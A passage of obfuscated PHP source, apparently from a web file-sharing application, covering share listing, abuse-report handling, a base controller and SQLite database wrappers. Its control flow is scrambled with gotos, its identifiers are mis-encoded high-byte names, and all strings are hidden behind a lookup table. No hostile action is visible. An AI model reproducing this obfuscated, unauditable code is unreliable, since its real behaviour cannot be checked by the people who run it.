$DöŠÄ†»¬‡)); goto FˆŞÁ—­Ù‘; FˆŞÁ—­Ù‘: $this->where($d°Í¢ìâ½¯)->delete(); Model($FÚ„«¤†™¸[559])->where($d°Í¢ìâ½¯)->delete(); goto f¦êğˆ«çƒ; f¦êğˆ«çƒ: } public function listAll($c¤ö š—) { goto f÷ É¿²¨¨; E‰ĞØ‹®—: if ($c¤ö š—[$bÛ¾ÍÒ–Á£[715]]) { $b†ñÉ°’­… = $c¤ö š—[$bÛ¾ÍÒ–Á£[470]] ? $c¤ö š—[$bÛ¾ÍÒ–Á£[470]] : strtotime(date($bÛ¾ÍÒ–Á£[1820])); $båÌ•µÒ½ˆ[$bÛ¾ÍÒ–Á£[192]] = array($bÛ¾ÍÒ–Á£[329], array($c¤ö š—[$bÛ¾ÍÒ–Á£[715]], $b†ñÉ°’­…)); } if ($c¤ö š—[$bÛ¾ÍÒ–Á£[29]]) { $båÌ•µÒ½ˆ[$c¤ö š—[$bÛ¾ÍÒ–Á£[29]]] = 1; } else { $båÌ•µÒ½ˆ[] = array($bÛ¾ÍÒ–Á£[467] => array($bÛ¾ÍÒ–Á£[946], 0), $bÛ¾ÍÒ–Á£[469] => array($bÛ¾ÍÒ–Á£[946], 0), $bÛ¾ÍÒ–Á£[1797] => $bÛ¾ÍÒ–Á£[1751]); } if ($c¤ö š—[$bÛ¾ÍÒ–Á£[1747]]) { $båÌ•µÒ½ˆ[] = array($bÛ¾ÍÒ–Á£[464] => $c¤ö š—[$bÛ¾ÍÒ–Á£[1747]], $bÛ¾ÍÒ–Á£[1405] => array($bÛ¾ÍÒ–Á£[378], "\45{$c¤ö š—[$bÛ¾ÍÒ–Á£[1747]]}\45"), $bÛ¾ÍÒ–Á£[1797] => $bÛ¾ÍÒ–Á£[1751]); } goto E¶…‚¤ö­ˆ; cç®ß×™: return $Fíªìªšçõ; goto Dƒğ«Ùõ‡á; E¶…‚¤ö­ˆ: $Fíªìªšçõ = $this->_makeOrder()->where($båÌ•µÒ½ˆ)->selectPage(20); if (empty($Fíªìªšçõ[$bÛ¾ÍÒ–Á£[365]])) { return array(); } $this->_listDataApply($Fíªìªšçõ[$bÛ¾ÍÒ–Á£[365]]); goto cç®ß×™; f÷ É¿²¨¨: $bÛ¾ÍÒ–Á£ =& $_SERVER[Š‰]; $båÌ•µÒ½ˆ = array(); if ($c¤ö š—[$bÛ¾ÍÒ–Á£[1500]]) { $båÌ•µÒ½ˆ[$bÛ¾ÍÒ–Á£[1500]] = $c¤ö š—[$bÛ¾ÍÒ–Á£[1500]]; } goto E‰ĞØ‹®—; Dƒğ«Ùõ‡á: } public function listDataApply($Còšƒ‡‰ÃÎ) { $this->_listDataApply($Còšƒ‡‰ÃÎ); return $Còšƒ‡‰ÃÎ; } private function _listDataApply(&$aì‘Ö«®¢ò) { goto bôô÷ù»ã¦; aß°…‹İÚ: unset($aóô Ìº¡Œ); goto bßÊ¤Ã«; a‹Œ¿Â‹¯¡: $c»§¥’ô = array_to_keyvalue($aì‘Ö«®¢ò, $EÅ…ˆ¤õÇî[33], $EÅ…ˆ¤õÇî[390]); $AÑ£ÎÕËÔ = Model($EÅ…ˆ¤õÇî[775])->sourceListInfo($c»§¥’ô, !0); foreach ($aì‘Ö«®¢ò as &$aóô Ìº¡Œ) { $aÁÊƒŸ¥–¶ = $aóô Ìº¡Œ[$EÅ…ˆ¤õÇî[1500]]; $aóô Ìº¡Œ[$EÅ…ˆ¤õÇî[1821]] = $EéŞ²Šã‡[$aÁÊƒŸ¥–¶] ? $EéŞ²Šã‡[$aÁÊƒŸ¥–¶] : !1; $Bˆ“ƒ¢á   = $aóô Ìº¡Œ[$EÅ…ˆ¤õÇî[390]]; $aóô Ìº¡Œ[$EÅ…ˆ¤õÇî[84]] = $AÑ£ÎÕËÔ[$Bˆ“ƒ¢á  ] ? $AÑ£ÎÕËÔ[$Bˆ“ƒ¢á  ] : !1; } goto aß°…‹İÚ; bôô÷ù»ã¦: $EÅ…ˆ¤õÇî =& $_SERVER[Š‰]; $DÍÙË½Ğ¾“ = array_to_keyvalue($aì‘Ö«®¢ò, $EÅ…ˆ¤õÇî[33], $EÅ…ˆ¤õÇî[1500]); $EéŞ²Šã‡ = Model($EÅ…ˆ¤õÇî[501])->userListInfo(array_unique($DÍÙË½Ğ¾“)); goto a‹Œ¿Â‹¯¡; bßÊ¤Ã«: } private function _makeOrder($Fî‘†´ÄŒ¨ = '') { goto b×°Æ‡ššÖ; b×°Æ‡ššÖ: $dÚÄ›ğÛÂ =& $_SERVER[Š‰]; $C×â‰‘¸Ò = array($dÚÄ›ğÛÂ[192], $dÚÄ›ğÛÂ[470], $dÚÄ›ğÛÂ[1810], $dÚÄ›ğÛÂ[1811]); $AÇ×ŸÈÇ¢è = array($dÚÄ›ğÛÂ[422] => $dÚÄ›ğÛÂ[423], $dÚÄ›ğÛÂ[424] => $dÚÄ›ğÛÂ[425]); goto C›îÉšèë; FŒÌ¨³“±: $Fî‘†´ÄŒ¨ = $Fî‘†´ÄŒ¨ . "{$eÑ§ã÷¹™»}\x20{$d’Ú¦Å¼êÔ}"; return $this->order($Fî‘†´ÄŒ¨); goto aÃİº’Ğ¬£; C›îÉšèë: $eÑ§ã÷¹™» = Input::get($dÚÄ›ğÛÂ[429], $dÚÄ›ğÛÂ[7], $dÚÄ›ğÛÂ[410], $C×â‰‘¸Ò); $d’Ú¦Å¼êÔ = Input::get($dÚÄ›ğÛÂ[430], $dÚÄ›ğÛÂ[7], $dÚÄ›ğÛÂ[1822], array($dÚÄ›ğÛÂ[1746], $dÚÄ›ğÛÂ[424])); $d’Ú¦Å¼êÔ = $AÇ×ŸÈÇ¢è[$d’Ú¦Å¼êÔ]; goto FŒÌ¨³“±; aÃİº’Ğ¬£: } public function reportAdd($cö¹“àƒ’ï) { $d×ôå«ß¢Û =& $_SERVER[Š‰]; $fŸ£Ù÷˜Ü = array($d×ôå«ß¢Û[462] => $cö¹“àƒ’ï[$d×ôå«ß¢Û[462]], $d×ôå«ß¢Û[1500] => USER_ID); if (Model($d×ôå«ß¢Û[1818])->where($fŸ£Ù÷˜Ü)->find()) { return !1; } $bĞÙ™‚‚•‰ = array($d×ôå«ß¢Û[462] => $cö¹“àƒ’ï[$d×ôå«ß¢Û[462]], $d×ôå«ß¢Û[1405] => $cö¹“àƒ’ï[$d×ôå«ß¢Û[1405]], $d×ôå«ß¢Û[390] => $cö¹“àƒ’ï[$d×ôå«ß¢Û[390]], $d×ôå«ß¢Û[441] => $cö¹“àƒ’ï[$d×ôå«ß¢Û[441]], $d×ôå«ß¢Û[1500] => USER_ID, $d×ôå«ß¢Û[29] => $cö¹“àƒ’ï[$d×ôå«ß¢Û[29]], $d×ôå«ß¢Û[425] => $cö¹“àƒ’ï[$d×ôå«ß¢Û[425]]); return Model($d×ôå«ß¢Û[1818])->add($bĞÙ™‚‚•‰); } public function reportList($F•¤²×Ìòë) { goto dš¬­Ş‰÷ß; e²±ôíÂåĞ: if (empty($B‰ğãÕÀÙ¤[$fãŠ“˜Ùâğ[365]])) { return array(); } $this->_listDataApply($B‰ğãÕÀÙ¤[$fãŠ“˜Ùâğ[365]]); return $B‰ğãÕÀÙ¤; goto E‡‡•®Âà; C†Úë”¼„: $còÆ‰Ú†´ = array($fãŠ“˜Ùâğ[422] => $fãŠ“˜Ùâğ[423], $fãŠ“˜Ùâğ[424] => $fãŠ“˜Ùâğ[425]); $eèÓÂ‹™â = $fãŠ“˜Ùâğ[1827] . $còÆ‰Ú†´[$EÍºèÉê¬]; $B‰ğãÕÀÙ¤ = Model($fãŠ“˜Ùâğ[1818])->where($E’ŞÛ†š¤°)->order($eèÓÂ‹™â)->selectPage(20); goto e²±ôíÂåĞ; e¢¼ŸÎ±›: if (isset($F•¤²×Ìòë[$fãŠ“˜Ùâğ[29]]) && in_array($F•¤²×Ìòë[$fãŠ“˜Ùâğ[29]], array($fãŠ“˜Ùâğ[86], $fãŠ“˜Ùâğ[1823], $fãŠ“˜Ùâğ[1824], $fãŠ“˜Ùâğ[1825], $fãŠ“˜Ùâğ[1826]))) { $E’ŞÛ†š¤°[$fãŠ“˜Ùâğ[29]] = $F•¤²×Ìòë[$fãŠ“˜Ùâğ[29]]; } if (isset($F•¤²×Ìòë[$fãŠ“˜Ùâğ[702]]) && in_array($F•¤²×Ìòë[$fãŠ“˜Ùâğ[702]], array($fãŠ“˜Ùâğ[491], $fãŠ“˜Ùâğ[86], $fãŠ“˜Ùâğ[1823], $fãŠ“˜Ùâğ[1824]))) { $E’ŞÛ†š¤°[$fãŠ“˜Ùâğ[702]] = $F•¤²×Ìòë[$fãŠ“˜Ùâğ[702]]; } $EÍºèÉê¬ = Input::get($fãŠ“˜Ùâğ[430], $fãŠ“˜Ùâğ[7], $fãŠ“˜Ùâğ[1822], array($fãŠ“˜Ùâğ[1746], $fãŠ“˜Ùâğ[424])); goto C†Úë”¼„; dš¬­Ş‰÷ß: $fãŠ“˜Ùâğ =& $_SERVER[Š‰]; $E’ŞÛ†š¤° = array(); if ($F•¤²×Ìòë[$fãŠ“˜Ùâğ[715]]) { $Cø„îãÓø = $F•¤²×Ìòë[$fãŠ“˜Ùâğ[470]] ? $F•¤²×Ìòë[$fãŠ“˜Ùâğ[470]] : strtotime(date($fãŠ“˜Ùâğ[1820])); $E’ŞÛ†š¤°[$fãŠ“˜Ùâğ[192]] = array($fãŠ“˜Ùâğ[329], array($F•¤²×Ìòë[$fãŠ“˜Ùâğ[715]], $Cø„îãÓø)); } goto e¢¼ŸÎ±›; E‡‡•®Âà: } public function reportStatus($FŒøâöÈŒ‘) { goto eòÆÜŒö¬; eòÆÜŒö¬: $dñµÛƒ…î¹ =& $_SERVER[Š‰]; $fÅÉÊËÒ = array($dñµÛƒ…î¹[388] => $FŒøâöÈŒ‘[$dñµÛƒ…î¹[388]]); $D¦œä‹ÂÀí = Model($dñµÛƒ…î¹[1818])->where($fÅÉÊËÒ)->field($dñµÛƒ…î¹[1828])->find(); goto eĞÑ´›Šˆá; E•á¯èÉÂ: $e˜À§Ğ»Á = Model($dñµÛƒ…î¹[1818])->where($fÅÉÊËÒ)->save($C‡œèòù§¶); if ($FŒøâöÈŒ‘[$dñµÛƒ…î¹[702]] == $dñµÛƒ…î¹[1823]) { if ($D¦œä‹ÂÀí[$dñµÛƒ…î¹[441]] != $dñµÛƒ…î¹[491] && $this->shareFileMeta($D¦œä‹ÂÀí[$dñµÛƒ…î¹[441]])) { $this->shareFileMeta($D¦œä‹ÂÀí[$dñµÛƒ…î¹[441]], 0); } $this->remove($D¦œä‹ÂÀí[$dñµÛƒ…î¹[462]]); return !0; } if ($e˜À§Ğ»Á && $FŒøâöÈŒ‘[$dñµÛƒ…î¹[702]] == $dñµÛƒ…î¹[1824]) { $aÄŒĞ¥ŸØ = $C‡œèòù§¶[$dñµÛƒ…î¹[702]] == $dñµÛƒ…î¹[1824] ? 1 : 0; $this->shareFileMeta($D¦œä‹ÂÀí[$dñµÛƒ…î¹[441]], $aÄŒĞ¥ŸØ); $this->removeByFile($D¦œä‹ÂÀí[$dñµÛƒ…î¹[441]]); } goto f“©±ˆœ„; f“©±ˆœ„: return $e˜À§Ğ»Á; goto B•Ãœ¿ä§; eĞÑ´›Šˆá: if (!$D¦œä‹ÂÀí) { return !1; } $C‡œèòù§¶ = array($dñµÛƒ…î¹[702] => $FŒøâöÈŒ‘[$dñµÛƒ…î¹[702]]); if ($FŒøâöÈŒ‘[$dñµÛƒ…î¹[702]] == $dñµÛƒ…î¹[1824] && $D¦œä‹ÂÀí[$dñµÛƒ…î¹[702]] == $dñµÛƒ…î¹[1824]) { $C‡œèòù§¶[$dñµÛƒ…î¹[702]] = 0; } goto E•á¯èÉÂ; B•Ãœ¿ä§: } private function removeByFile($e—ªÏ„„å) { goto Eòò ‚ŸŸÂ; Eòò ‚ŸŸÂ: $d™´Ø´ƒÅ =& $_SERVER[Š‰]; $AÕËÔê¯˜¡ = Model($d™´Ø´ƒÅ[775])->where(array($d™´Ø´ƒÅ[441] => $e—ªÏ„„å))->field($d™´Ø´ƒÅ[390])->select(); $e‡‹»£¯¤Å = array_to_keyvalue($AÕËÔê¯˜¡, $d™´Ø´ƒÅ[33], $d™´Ø´ƒÅ[390]); goto E¯½“ß‹Åå; E¯½“ß‹Åå: $aÃ˜ŸÛİÏ‚ = array($d™´Ø´ƒÅ[390] => array($d™´Ø´ƒÅ[7], $e‡‹»£¯¤Å), $d™´Ø´ƒÅ[467] => 1); $AÕËÔê¯˜¡ = Model($d™´Ø´ƒÅ[1640])->where($aÃ˜ŸÛİÏ‚)->field($d™´Ø´ƒÅ[462])->select(); if (empty($AÕËÔê¯˜¡)) { return; } goto dø¿°Ë³–¸; dø¿°Ë³–¸: $aÎãîÜØÍì = array_to_keyvalue($AÕËÔê¯˜¡, $d™´Ø´ƒÅ[33], $d™´Ø´ƒÅ[462]); $this->remove($aÎãîÜØÍì); goto B‹Úº±‚é±; B‹Úº±‚é±: } private function shareFileMeta($cÃ¤¹³Šì¡, $E Ê¢ÆĞˆ = null) { $Aì½™µãŸİ =& $_SERVER[Š‰]; $EÁî†õ ·Õ = array($Aì½™µãŸİ[441] => $cÃ¤¹³Šì¡, $Aì½™µãŸİ[92] => $Aì½™µãŸİ[1829]); if (is_null($E Ê¢ÆĞˆ)) { return Model($Aì½™µãŸİ[1830])->where($EÁî†õ ·Õ)->find(); } $EÁî†õ ·Õ[$Aì½™µãŸİ[370]] = $E Ê¢ÆĞˆ; Model($Aì½™µãŸİ[1830])->add($EÁî†õ ·Õ, array(), !0); } } goto c¶µªÃìºÓ; BËè…¾¿è´: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto C©³‹‘‚ä­; Cªà›Ì¶Í–: $this->in =& $in; $this->values[$aÈÇ¤­¡ªá[6]] =& $config; $this->values[$aÈÇ¤­¡ªá[7]] =& $in; goto eÈãÄºÂ¢»; eÈãÄºÂ¢»: $this->tpl = TEMPLATE . MOD . $aÈÇ¤­¡ªá[8]; $this->_classObjectID = mt_rand(0, 10000); goto D‚¼ºéœÁ–; C©³‹‘‚ä­: $aÈÇ¤­¡ªá =& $_SERVER[Š‰]; global $in, $config; $this->config =& $config; goto Cªà›Ì¶Í–; D‚¼ºéœÁ–: } public function loadClass($f‹ìÎ…Â¿) { if (1 === func_num_args()) { $this->{$f‹ìÎ…Â¿} = new $f‹ìÎ…Â¿(); } else { $Aˆ¹¿ìóèò = new ReflectionClass($f‹ìÎ…Â¿); $BŒ†­Èè¨ = func_get_args(); array_shift($BŒ†­Èè¨); $this->{$f‹ìÎ…Â¿} = $Aˆ¹¿ìóèò->newInstanceArgs($BŒ†­Èè¨); } return $this->{$f‹ìÎ…Â¿}; } protected function assign($A¿ª¤ø ©º, $AÀƒÅøƒˆš) { $this->values[$A¿ª¤ø ©º] = $AÀƒÅøƒˆš; } protected function display($fÇÚî¼ˆ¦©) { ob_end_clean(); extract($this->values); require $this->tpl . $fÇÚî¼ˆ¦©; } } class DbSqliteBase extends Db { public function __construct($DÒÜ¼ˆ¹á« = '') { $fƒ¼ã°—Ş =& $_SERVER[Š‰]; if (!extension_loaded($fƒ¼ã°—Ş[9])) { think_exception(think_lang($fƒ¼ã°—Ş[10]) . $fƒ¼ã°—Ş[11]); } if (!empty($DÒÜ¼ˆ¹á«)) { if (!isset($DÒÜ¼ˆ¹á«[$fƒ¼ã°—Ş[12]])) { $DÒÜ¼ˆ¹á«[$fƒ¼ã°—Ş[12]] = 438; } $this->config = $DÒÜ¼ˆ¹á«; if (empty($this->config[$fƒ¼ã°—Ş[13]])) { $this->config[$fƒ¼ã°—Ş[13]] = array(); } } } public function connect($dŒòÕÜ„·Ğ = '', $e¥Ğ¿Çê Ñ = 0) { $CëÛÅ¥º¥Ã =& $_SERVER[Š‰]; if (!isset($this->linkID[$e¥Ğ¿Çê Ñ])) { goto B‚ÚÎå‘…×; ağÓ–¸ÀÆø: @sqlite_busy_timeout($this->linkID[$e¥Ğ¿Çê Ñ], 30000); if (1 != think_config($CëÛÅ¥º¥Ã[18])) { unset($this->config); } goto F˜ƒ“öõ“ã; B‚ÚÎå‘…×: if (empty($dŒòÕÜ„·Ğ)) { $dŒòÕÜ„·Ğ = $this->config; } $Fƒš­ß›×½ = !empty($dŒòÕÜ„·Ğ[$CëÛÅ¥º¥Ã[13]][$CëÛÅ¥º¥Ã[14]]) ? $dŒòÕÜ„·Ğ[$CëÛÅ¥º¥Ã[13]][$CëÛÅ¥º¥Ã[14]] : $this->pconnect; $BÑóÔÄ†½š = $Fƒš­ß›×½ ? $CëÛÅ¥º¥Ã[15] : $CëÛÅ¥º¥Ã[16]; goto fÉ¾»¹§; fÉ¾»¹§: $this->linkID[$e¥Ğ¿Çê Ñ] = $BÑóÔÄ†½š($dŒòÕÜ„·Ğ[$CëÛÅ¥º¥Ã[17]], $dŒòÕÜ„·Ğ[$CëÛÅ¥º¥Ã[12]]); if (!$this->linkID[$e¥Ğ¿Çê Ñ]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto ağÓ–¸ÀÆø; F˜ƒ“öõ“ã: } return $this->linkID[$e¥Ğ¿Çê Ñ]; } public function free() { $this->queryID = null; } public function query($fÈ«‹ƒâ®ß) { goto E±¼ãíÅ Ê; B‘áÎèÉíó: think_status($dˆáÆ²áß¿[20]); $this->queryID = sqlite_query($this->_linkID, $fÈ«‹ƒâ®ß); $this->debug(); goto dÖÎ¹œˆçƒ; E±¼ãíÅ Ê: $dˆáÆ²áß¿ =& $_SERVER[Š‰]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto B·âŠÇ–Ó÷; B·âŠÇ–Ó÷: $this->queryStr = $fÈ«‹ƒâ®ß; if ($this->queryID) { $this->free(); } think_action_status($dˆáÆ²áß¿[19], 1); goto B‘áÎèÉíó; dÖÎ¹œˆçƒ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $b¦‚¯¨¸•Ò = $this->getAll(); return $b¦‚¯¨¸•Ò; } goto C·ã±·ù°£; C·ã±·ù°£: } public function execute($EãÄ¹ÛÊÁ) { goto B‹óùàº§Û; E•ºİÀŠ»½: if (!1 === $EƒÚ†÷ÛÌ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto CÕÂÖÂĞÊ; B‹óùàº§Û: $aÕêª”¯ =& $_SERVER[Š‰]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto AİÆİíò†‡; F•ƒËÇ¬Ã´: think_status($aÕêª”¯[20]); $EƒÚ†÷ÛÌ = sqlite_exec($this->_linkID, $EãÄ¹ÛÊÁ); $this->debug(); goto E•ºİÀŠ»½; AİÆİíò†‡: $this->queryStr = $EãÄ¹ÛÊÁ; if ($this->queryID) { $this->free(); } think_action_status($aÕêª”¯[21], 1); goto F•ƒËÇ¬Ã´; CÕÂÖÂĞÊ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Š‰][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $DÔ¹Ò…‡³å = sqlite_query($this->_linkID, $_SERVER[Š‰][23]); if (!$DÔ¹Ò…‡³å) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $b”â×² å = sqlite_query($this->_linkID, $_SERVER[Š‰][24]); if (!$b”â×² å) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $FÒõİ±—» = array(); if ($this->numRows > 0) { for ($Dä·âøô¿Ñ = 0; $Dä·âøô¿Ñ < $this->numRows; $Dä·âøô¿Ñ++) { $FÒõİ±—»[$Dä·âøô¿Ñ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $FÒõİ±—»; } public function getFields($a§éŒˆ™Ü) { $añÁ£ğ…¸¦ =& $_SERVER[Š‰]; $C™øöÛªò¿ = $this->query($añÁ£ğ…¸¦[25] . $a§éŒˆ™Ü . $añÁ£ğ…¸¦[26]); $FØ¬×ê¼ = array(); if ($C™øöÛªò¿) { foreach ($C™øöÛªò¿ as $cì—á­·†œ => $d¢à¿…§À) { $FØ¬×ê¼[$d¢à¿…§À[$añÁ£ğ…¸¦[27]]] = array($añÁ£ğ…¸¦[28] => $d¢à¿…§À[$añÁ£ğ…¸¦[27]], $añÁ£ğ…¸¦[29] => $d¢à¿…§À[$añÁ£ğ…¸¦[30]], $añÁ£ğ…¸¦[31] => (bool) ($d¢à¿…§À[$añÁ£ğ…¸¦[32]] === $añÁ£ğ…¸¦[33]), $añÁ£ğ…¸¦[34] => $d¢à¿…§À[$añÁ£ğ…¸¦[35]], $añÁ£ğ…¸¦[36] => strtolower($d¢à¿…§À[$añÁ£ğ…¸¦[37]]) == $añÁ£ğ…¸¦[38], $añÁ£ğ…¸¦[39] => strtolower($d¢à¿…§À[$añÁ£ğ…¸¦[40]]) == $añÁ£ğ…¸¦[41]); } } return $FØ¬×ê¼; } public function getTables($FËÄ—Ò¢ö– = '') { $d¬ÜÓïÏ¶— =& $_SERVER[Š‰]; $fæ¦Î¡Ò± = $this->query($d¬ÜÓïÏ¶—[42] . $d¬ÜÓïÏ¶—[43] . $d¬ÜÓïÏ¶—[44]); $bñ‹‚„›æ× = array(); foreach ($fæ¦Î¡Ò± as $dæÓ­µŞô => $C‘çé¼Š¯) { $bñ‹‚„›æ×[$dæÓ­µŞô] = current($C‘çé¼Š¯); } return $bñ‹‚„›æ×; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $bÀšç‰Ö =& $_SERVER[Š‰]; $cæœ¤®´Ş = sqlite_last_error($this->_linkID); $this->error = $cæœ¤®´Ş . $bÀšç‰Ö[4] . sqlite_error_string($cæœ¤®´Ş); if ($bÀšç‰Ö[33] != $this->queryStr) { $this->error .= LNG($bÀšç‰Ö[45]) . $this->queryStr; } think_trace($this->error, $bÀšç‰Ö[33], $bÀšç‰Ö[46]); return $this->error; } public function escapeString($Bˆ‚•ƒô•) { return sqlite_escape_string($Bˆ‚•ƒô•); } public function parseLimit($A˜ë„¢ö‰ç) { $E½Û”‡½µù =& $_SERVER[Š‰]; $FóƒÅÛ¦Ò = $E½Û”‡½µù[33]; if (!empty($A˜ë„¢ö‰ç)) { $A˜ë„¢ö‰ç = explode($E½Û”‡½µù[47], $A˜ë„¢ö‰ç); if (count($A˜ë„¢ö‰ç) > 1) { $FóƒÅÛ¦Ò .= $E½Û”‡½µù[48] . $A˜ë„¢ö‰ç[1] . $E½Û”‡½µù[49] . $A˜ë„¢ö‰ç[0] . $E½Û”‡½µù[50]; } else { $FóƒÅÛ¦Ò .= $E½Û”‡½µù[48] . $A˜ë„¢ö‰ç[0] . $E½Û”‡½µù[50]; } } return $FóƒÅÛ¦Ò; } } class DbSqlite3Base extends Db { public function __construct($EÔß“÷½» = '') { $C¬õ®ßÎ× =& $_SERVER[Š‰]; if (!class_exists($C¬õ®ßÎ×[51])) { think_exception(think_lang($C¬õ®ßÎ×[10]) . $C¬õ®ßÎ×[52]); } if (!empty($EÔß“÷½»)) { if (!isset($EÔß“÷½»[$C¬õ®ßÎ×[12]])) { $EÔß“÷½»[$C¬õ®ßÎ×[12]] = 438; } $this->config = $EÔß“÷½»; if (empty($this->config[$C¬õ®ßÎ×[13]])) { $this->config[$C¬õ®ßÎ×[13]] = array(); } } } public function connect($fšˆÍÒÇæ = '', $dªÇÓ±›Ñ = 0) { $e²ˆì•³ïŞ =& $_SERVER[Š‰]; if (!isset($this->linkID[$dªÇÓ±›Ñ])) { if (empty($fšˆÍÒÇæ)) { $fšˆÍÒÇæ = $this->config; } $this->linkID[$dªÇÓ±›Ñ] = new SQLite3($fšˆÍÒÇæ[$e²ˆì•³ïŞ[17]]); if (!$this->linkID[$dªÇÓ±›Ñ]) { think_exception($this->linkID[$dªÇÓ±›Ñ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$dªÇÓ±›Ñ]->busyTimeout(30000); if (1 != think_config($e²ˆì•³ïŞ[18])) { unset($this->config); } } return $this->linkID[$dªÇÓ±›Ñ]; } public function free() { $this->queryID = null; } public function query($eã§¦µ×Ù†) { goto F»…Ü­„ôŠ; C’‡„„™Ö: $this->queryStr = $eã§¦µ×Ù†; if ($this->queryID) { $this->free(); } think_action_status($b¸ïŠ‡†ƒÙ[19], 1); goto dÂ¥…Ìç¡Ç; F»…Ü­„ôŠ: $b¸ïŠ‡†ƒÙ =& $_SERVER[Š‰]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto C’‡„„™Ö; dÂ¥…Ìç¡Ç: think_status($b¸ïŠ‡†ƒÙ[20]); $this->queryID = $this->_linkID->query($eã§¦µ×Ù†); $this->debug(); goto eîÉ¾Ã¥‚Ò; eîÉ¾Ã¥‚Ò: if (!1 === $this->queryID) { $this->error(); return !1; } else { $d‘´‘õˆÌ¥ = $this->getAll(); $this->numRows = count($d‘´‘õˆÌ¥); return $d‘´‘õˆÌ¥; } goto AÕ´¾ÒŒ°; AÕ´¾ÒŒ°: } public function execute($CâÕ ‹Î…) { goto b¤™†ìíË; a¢Õ¶–ì: $this->queryStr = $CâÕ ‹Î…; if ($this->queryID) { $this->free(); } think_action_status($D„÷ø¢Ü°ù[21], 1); goto B”—ƒçÄ‹¡; b¤™†ìíË: $D„÷ø¢Ü°ù =& $_SERVER[Š‰]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto a¢Õ¶–ì; B÷é‚¨’’: if (!1 === $Aš¸µÍƒªø) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto bÎÚ˜â‡Ñ; B”—ƒçÄ‹¡: think_status($D„÷ø¢Ü°ù[20]); $Aš¸µÍƒªø = $this->_linkID->exec($CâÕ ‹Î…); $this->debug(); goto B÷é‚¨’’; bÎÚ˜â‡Ñ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Š‰][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $FšÖÂÚÏ˜… = $this->_linkID->query($_SERVER[Š‰][23]); if (!$FšÖÂÚÏ˜…) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $D©«èŸ±‘ò = $this->_linkID->query($_SERVER[Š‰][24]); if (!$D©«èŸ±‘ò) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Cº³´ô¥ç = array(); while ($D…ÈĞ—„ù¾ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Cº³´ô¥ç[] = $D…ÈĞ—„ù¾; } $this->queryID->reset(); return $Cº³´ô¥ç; } public function getFields($EÚ¶¡Õ¦‹) { $AáÕÄ‰÷‡‘ =& $_SERVER[Š‰]; $D’¾Ä¼° = $this->query($AáÕÄ‰÷‡‘[25] . $EÚ¶¡Õ¦‹ . $AáÕÄ‰÷‡‘[26]); $cßÆ¸¯Ñğ = array(); if ($D’¾Ä¼°) { foreach ($D’¾Ä¼° as $fÂëÄª–…‰ => $BÎ‹ä×•ÚÜ) { $cßÆ¸¯Ñğ[$BÎ‹ä×•ÚÜ[$AáÕÄ‰÷‡‘[28]]] = array($AáÕÄ‰÷‡‘[28] => $BÎ‹ä×•ÚÜ[$AáÕÄ‰÷‡‘[28]], $AáÕÄ‰÷‡‘[29] => $BÎ‹ä×•ÚÜ[$AáÕÄ‰÷‡‘[29]], $AáÕÄ‰÷‡‘[31] => (bool) ($BÎ‹ä×•ÚÜ[$AáÕÄ‰÷‡‘[31]] === $AáÕÄ‰÷‡‘[33]), $AáÕÄ‰÷‡‘[34] => $BÎ‹ä×•ÚÜ[$AáÕÄ‰÷‡‘[53]], $AáÕÄ‰÷‡‘[36] => (bool) $BÎ‹ä×•ÚÜ[$AáÕÄ‰÷‡‘[54]], $AáÕÄ‰÷‡‘[39] => (bool) $BÎ‹ä×•ÚÜ[$AáÕÄ‰÷‡‘[54]]); } } return $cßÆ¸¯Ñğ; } public function getTables($B ¥´¹„Œ = '') { $Cğõ„–§– =& $_SERVER[Š‰]; $C‰¸ŞŠ½Ç = $this->query($Cğõ„–§–[42] . $Cğõ„–§–[43] . $Cğõ„–§–[44]); $AíÕùÀ› = array(); foreach ($C‰¸ŞŠ½Ç as $EŠ‰£š¹ïµ => $d§¾ğ¡³‹‰) { $AíÕùÀ›[$EŠ‰£š¹ïµ] = current($d§¾ğ¡³‹‰); } return $AíÕùÀ›; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $DÏùî¦â¾ =& $_SERVER[Š‰]; $this->error = $this->_linkID->lastErrorMsg(); if ($DÏùî¦â¾[33] != $this->queryStr) { $this->error .= LNG($DÏùî¦â¾[45]) . $this->queryStr; } think_trace($this->error, $DÏùî¦â¾[33], $DÏùî¦â¾[46]); return $this->error; } public function escapeString($eˆİÁŒÎ°ó) { $câ´œ¿¼¦ô =& $_SERVER[Š‰]; if ($this->_linkID) { return $this->_linkID->escapeString($eˆİÁŒÎ°ó); } return str_ireplace($câ´œ¿¼¦ô[55], $câ´œ¿¼¦ô[56], $eˆİÁŒÎ°ó); } public function parseLimit($B„…«ô¬¢ª) { $DİáôˆÊ§ =& $_SERVER[Š‰]; $cã§ùğ÷Ÿ£ = $DİáôˆÊ§[33]; if (!empty($B„…«ô¬¢ª)) { $B„…«ô¬¢ª = 